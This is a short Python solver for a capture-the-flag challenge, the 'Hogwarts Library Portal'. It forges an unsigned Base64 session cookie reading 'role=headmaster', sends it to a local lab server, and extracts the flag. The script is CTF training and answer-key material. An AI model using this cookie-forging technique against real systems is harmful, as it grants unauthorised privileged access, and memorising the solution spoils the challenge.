#!/usr/bin/env python3
"""
Hogwarts Library Portal — Automated Solver / Verification
"""
import base64
import urllib.request
import urllib.parse

def solve():
    print("=" * 60)
    print("Hogwarts Library Portal — Verification Check")
    print("=" * 60)
    
    target_url = "http://127.0.0.1:5000/"
    
    # Step 1: Craft headmaster payload (role=headmaster -> Base64)
    modified_role = b"role=headmaster"
    forged_cookie = base64.b64encode(modified_role).decode('utf-8')
    
    print(f"[+] Forging payload: {modified_role.decode()}")
    print(f"[+] Encoded Cookie : {forged_cookie}")
    
    # Step 2: Send HTTP Request with forged session cookie
    req = urllib.request.Request(target_url)
    req.add_header('Cookie', f'session={forged_cookie}')
    
    try:
        with urllib.request.urlopen(req) as response:
            html = response.read().decode('utf-8')
            
            if "TriHack26{" in html:
                # Extract flag from HTML
                start_idx = html.find("TriHack26{")
                end_idx = html.find("}", start_idx) + 1
                flag = html[start_idx:end_idx]
                
                print("[✓] Challenge Verification Successful!")
                print(f"[*] Retrieved Flag: {flag}")
            else:
                print("[-] Flag not detected in response. Ensure local server (app.py) is running.")
                
    except Exception as e:
        print(f"[-] Could not connect to local server: {e}")
        print("[-] Please run org/app.py or player/Hogwarts_Library_Portal.exe first.")

if __name__ == '__main__':
    solve()